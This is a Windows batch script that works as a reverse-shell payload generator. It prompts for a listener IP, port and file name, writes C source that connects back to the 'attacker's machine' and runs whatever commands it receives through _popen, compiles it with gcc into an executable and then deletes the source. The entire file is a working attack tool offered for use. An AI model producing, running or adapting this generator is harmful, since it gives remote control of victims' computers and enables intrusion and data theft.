@echo off
setlocal enabledelayedexpansion

:: Set up color scheme
color 0A

:: Prompt the user for LHOST, LPORT, and OUTPUT filename
echo ENTER LHOST:
set /p LHOST=
echo ENTER LPORT:
set /p LPORT=
echo ENTER OUTPUT:
set /p OUTPUT=

:: Create the C file with the user's input
(
echo #include <stdio.h>
echo #include <stdlib.h>
echo #include <winsock2.h>
echo.
echo #pragma comment(lib, "ws2_32.lib")
echo.
echo #define LHOST "!LHOST!"  // Replace with your local IP
echo #define LPORT !LPORT!     // Replace with your desired listening port
echo.
echo int main() {
echo     WSADATA wsaData;
echo     SOCKET sock;
echo     struct sockaddr_in server;
echo     char buffer[1024];   // Changed from char *buffer[1024] to char buffer[1024]
echo.
echo     // Initialize Winsock
echo     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
echo         printf("WSAStartup failed. Exiting...\n");
echo         return 1;
echo     }
echo.
echo     // Create a socket
echo     sock = socket(AF_INET, SOCK_STREAM, 0);
echo     if (sock == INVALID_SOCKET) {
echo         printf("Socket creation failed. Exiting...\n");
echo         WSACleanup();
echo         return 1;
echo     }
echo.
echo     server.sin_family = AF_INET;
echo     server.sin_port = htons(LPORT);
echo     server.sin_addr.s_addr = inet_addr(LHOST);  // Convert the string IP to an address
echo.
echo     // Connect to the attacker’s machine
echo     if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
echo         printf("Connection failed. Exiting...\n");
echo         closesocket(sock);
echo         WSACleanup();
echo         return 1;
echo     }
echo.
echo     // Redirecting input/output to socket
echo     while (1) {
echo         // Receiving commands from the attacker
echo         recv(sock, buffer, sizeof(buffer), 0);
echo.
echo         // Execute the command
echo         FILE *fp = _popen(buffer, "r");
echo         if (fp == NULL) {
echo             send(sock, "Error executing command\n", 23, 0);
echo         } else {
echo             // Send the command output back to the attacker
echo             while (fgets(buffer, sizeof(buffer), fp) != NULL) {
echo                 send(sock, buffer, strlen(buffer), 0);
echo             }
echo             fclose(fp);
echo         }
echo     }
echo.
echo     closesocket(sock);
echo     WSACleanup();
echo     return 0;
echo }
) > "!OUTPUT!.c"

:: Check if the file was created
if exist "!OUTPUT!.c" (
    :: Compile the generated C file using GCC
    gcc -o "!OUTPUT!.exe" "!OUTPUT!.c" -lws2_32

    :: Check if the compilation was successful
    if exist "!OUTPUT!.exe" (
        echo.
        echo PAYLOAD GENERATED SUCCESSFULLY
        echo.
        
        :: Remove the C source file after successful compilation
        del /f /q "!OUTPUT!.c"
        echo The source file "!OUTPUT!.c" has been deleted.
    ) else (
        echo.
        echo Error during compilation.
    )
) else (
    echo.
    echo Failed to create the C file.
)

:: Reset color to default and pause
color
pause
